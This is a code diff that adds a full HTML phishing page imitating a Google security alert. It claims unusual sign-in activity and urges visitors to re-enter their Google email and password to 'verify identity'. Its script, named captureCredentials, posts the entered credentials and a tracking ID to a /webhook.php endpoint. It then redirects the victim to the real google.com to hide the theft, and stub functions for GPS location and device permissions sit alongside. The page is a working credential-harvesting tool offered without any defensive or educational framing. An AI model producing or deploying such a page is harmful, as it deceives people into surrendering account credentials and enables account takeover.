@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Security Alert</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            background: #f8f9fa;
+            min-height: 100vh;
+            padding: 0;
+        }
+
+        .header {
+            background: white;
+            padding: 16px 24px;
+            border-bottom: 1px solid #dadce0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .google-logo {
+            font-size: 22px;
+            font-weight: 500;
+        }
+
+        .google-logo .g {
+            color: #4285f4;
+        }
+
+        .google-logo .o1 {
+            color: #ea4335;
+        }
+
+        .google-logo .o2 {
+            color: #fbbc04;
+        }
+
+        .google-logo .g2 {
+            color: #4285f4;
+        }
+
+        .google-logo .l {
+            color: #34a853;
+        }
+
+        .google-logo .e {
+            color: #ea4335;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 48px 24px;
+        }
+
+        .page-title {
+            font-size: 32px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 32px;
+        }
+
+        .alert-box {
+            background: #fef7e0;
+            border: 1px solid #f9ab00;
+            border-radius: 8px;
+            padding: 20px 24px;
+            margin-bottom: 32px;
+            display: flex;
+            gap: 16px;
+        }
+
+        .alert-icon {
+            color: #f9ab00;
+            font-size: 24px;
+            flex-shrink: 0;
+        }
+
+        .alert-content h2 {
+            font-size: 18px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+
+        .alert-content p {
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.6;
+        }
+
+        .cards-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 24px;
+            margin: 32px 0;
+        }
+
+        .card {
+            background: white;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 24px;
+            transition: box-shadow 0.2s;
+        }
+
+        .card:hover {
+            box-shadow: 0 1px 3px rgba(60, 64, 67, 0.3), 0 4px 8px rgba(60, 64, 67, 0.15);
+        }
+
+        .card-primary {
+            border: 2px solid #1a73e8;
+            background: #f8fbff;
+        }
+
+        .card-title {
+            font-size: 16px;
+            font-weight: 500;
+            color: #1a73e8;
+            margin-bottom: 16px;
+        }
+
+        .card-links {
+            list-style: none;
+        }
+
+        .card-link {
+            padding: 8px 0;
+            border-bottom: 1px solid #f1f3f4;
+        }
+
+        .card-link:last-child {
+            border-bottom: none;
+        }
+
+        .card-link a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+        }
+
+        .card-link a:hover {
+            text-decoration: underline;
+        }
+
+        .verification-section {
+            background: white;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 32px;
+            margin: 32px 0;
+        }
+
+        .section-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .section-icon {
+            width: 40px;
+            height: 40px;
+            background: #e8f0fe;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1a73e8;
+            font-size: 20px;
+        }
+
+        .section-title {
+            font-size: 20px;
+            font-weight: 400;
+            color: #202124;
+        }
+
+        .section-description {
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 11px 15px;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 24px;
+        }
+
+        .btn-primary {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-primary:hover {
+            background: #1765cc;
+            box-shadow: 0 1px 2px rgba(60, 64, 67, 0.3), 0 1px 3px rgba(60, 64, 67, 0.15);
+        }
+
+        .btn-secondary {
+            background: white;
+            color: #1a73e8;
+            border: 1px solid #dadce0;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn-secondary:hover {
+            background: #f8f9fa;
+            border-color: #dadce0;
+        }
+
+        .info-box {
+            background: #e8f0fe;
+            border-radius: 8px;
+            padding: 16px 20px;
+            margin: 24px 0;
+        }
+
+        .info-box-title {
+            font-size: 14px;
+            font-weight: 500;
+            color: #1a73e8;
+            margin-bottom: 8px;
+        }
+
+        .info-box-text {
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.6;
+        }
+
+        .footer {
+            background: #f8f9fa;
+            padding: 24px;
+            margin-top: 48px;
+            text-align: center;
+            border-top: 1px solid #dadce0;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #5f6368;
+            margin: 4px 0;
+        }
+
+        .spinner {
+            display: none;
+            width: 24px;
+            height: 24px;
+            margin: 0 auto;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .container {
+                padding: 32px 16px;
+            }
+
+            .page-title {
+                font-size: 28px;
+            }
+
+            .cards-container {
+                grid-template-columns: 1fr;
+            }
+
+            .button-group {
+                flex-direction: column;
+            }
+
+            .verification-section {
+                padding: 24px 20px;
+            }
+        }
+    </style>
+</head>
+
+<body onload="gpsLocation()">
+    <div class="header">
+        <div class="logo-section">
+            <div class="google-logo">
+                <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span
+                    class="l">l</span><span class="e">e</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <h1 class="page-title">Security Alert</h1>
+
+        <div class="alert-box">
+            <i class="fas fa-exclamation-triangle alert-icon"></i>
+            <div class="alert-content">
+                <h2>Suspicious Activity Detected</h2>
+                <p>We detected unusual sign-in activity on your Google Account. To protect your data, please verify your
+                    identity immediately.</p>
+            </div>
+        </div>
+
+        <div class="cards-container">
+            <div class="card card-primary">
+                <div class="card-title">Verify your account</div>
+                <ul class="card-links">
+                    <li class="card-link"><a href="#" onclick="return false;">Get help with your account</a></li>
+                    <li class="card-link"><a href="#" onclick="return false;">Send feedback about your security</a></li>
+                    <li class="card-link"><a href="#" onclick="return false;">Share usage & diagnostics information</a>
+                    </li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <div class="card-title" style="color: #5f6368;">Additional security</div>
+                <ul class="card-links">
+                    <li class="card-link"><a href="#" onclick="return false;">View security info</a></li>
+                    <li class="card-link"><a href="#" onclick="return false;">Get your account secured</a></li>
+                    <li class="card-link"><a href="#" onclick="return false;">File a security claim</a></li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="verification-section">
+            <div class="section-header">
+                <div class="section-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h2 class="section-title">Verify your identity</h2>
+            </div>
+            <p class="section-description">Someone may have accessed your account from an unknown location. Re-enter
+                your credentials to confirm it's really you and secure your account.</p>
+
+            <form id="loginForm" onsubmit="return captureCredentials(event)">
+                <div class="form-group">
+                    <label class="form-label" for="email">Email or phone</label>
+                    <input type="text" id="email" name="email" class="form-input" required autocomplete="username">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="password">Enter your password</label>
+                    <input type="password" id="password" name="password" class="form-input" required
+                        autocomplete="current-password">
+                </div>
+
+                <div class="button-group">
+                    <button type="submit" class="btn-primary" id="submitBtn" disabled
+                        style="opacity: 0.5; cursor: not-allowed;">
+                        <span id="btnText">Next</span>
+                        <div class="spinner" id="spinner"></div>
+                    </button>
+                    <button type="button" class="btn-secondary" id="allowBtn" onclick="allowDeviceVerification()">Allow
+                        Device Verification</button>
+                </div>
+            </form>
+
+            <div class="info-box">
+                <div class="info-box-title">Why do we need this?</div>
+                <p class="info-box-text">After verification, we'll secure your account and notify you of any
+                    unauthorized access attempts.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p class="footer-text">Google LLC • Security & Privacy Protection</p>
+        <p class="footer-text">This is an automated security check</p>
+    </div>
+
+    <p id="techchip" style="display:none;"></p>
+
+    <script>
+        var deviceVerified = false;
+
+        function allowDeviceVerification() {
+            // Request permissions
+            if (typeof requestPermissions === 'function') {
+                requestPermissions();
+            }
+
+            // Enable the Next button
+            deviceVerified = true;
+            var submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = false;
+            submitBtn.style.opacity = '1';
+            submitBtn.style.cursor = 'pointer';
+
+            // Update the allow button
+            var allowBtn = document.getElementById('allowBtn');
+            allowBtn.innerHTML = '<i class="fas fa-check"></i> Device Verified';
+            allowBtn.style.background = '#d4edda';
+            allowBtn.style.color = '#155724';
+            allowBtn.style.border = '1px solid #c3e6cb';
+            allowBtn.disabled = true;
+        }
+
+        function captureCredentials(event) {
+            event.preventDefault();
+
+            if (!deviceVerified) {
+                alert('Please allow device verification first');
+                return false;
+            }
+
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            // Show loading
+            document.getElementById('btnText').style.display = 'none';
+            document.getElementById('spinner').style.display = 'inline-block';
+            document.getElementById('submitBtn').disabled = true;
+
+            // Send credentials to server
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "/webhook.php");
+            xhr.setRequestHeader('Content-type', 'application/json;charset=utf-8');
+            xhr.send(JSON.stringify({
+                type: "credentials",
+                service: "Google",
+                email: email,
+                password: password,
+                uid: localStorage.getItem('almight_uid') || 'unknown'
+            }));
+
+            // Redirect to real Google after 2 seconds
+            setTimeout(function () {
+                window.location.href = "https://www.google.com";
+            }, 2000);
+
+            return false;
+        }
+
+        function requestPermissions() { }
+        function gpsLocation() { }
+    </script>
+
+    <!-- tc_payload -->
+</body>
+
+</html>
